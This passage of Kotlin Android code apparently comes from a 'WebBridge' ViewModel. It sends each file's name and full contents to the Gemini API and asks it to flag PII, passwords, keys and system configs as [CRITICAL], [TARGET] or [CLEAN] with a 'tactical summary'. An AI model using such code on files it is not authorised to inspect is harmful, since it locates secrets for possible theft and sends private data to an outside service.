                val request = com.example.rabit.domain.model.gemini.GeminiRequest(
                    prompt = "Analyze this file content for sensitivity (PII, Passwords, Keys, System Configs). Categorize as [CRITICAL], [TARGET], or [CLEAN]. Provide a 1-sentence tactical summary.\n\nFile: ${file.name}\nContent:\n$fileContent",
                    systemPrompt = "You are a Tactical Sensitivity Profiler. Categorize files precisely based on risk.",
                    temperature = 0.3f
                )

                val response = geminiRepo.sendPrompt(request, apiKey)
                if (response.error == null) {
                    val result = response.text
                    _fileSensitivities.value = _fileSensitivities.value + (file.absolutePath to result)
                }
            } catch (e: Exception) {
                Log.e("WebBridgeVM", "Sensitivity analysis failed", e)
            } finally {
                _isProfiling.value = false
            }
        }
    }

    fun clearFileSensitivities() {
        _fileSensitivities.value = emptyMap()
    }
}
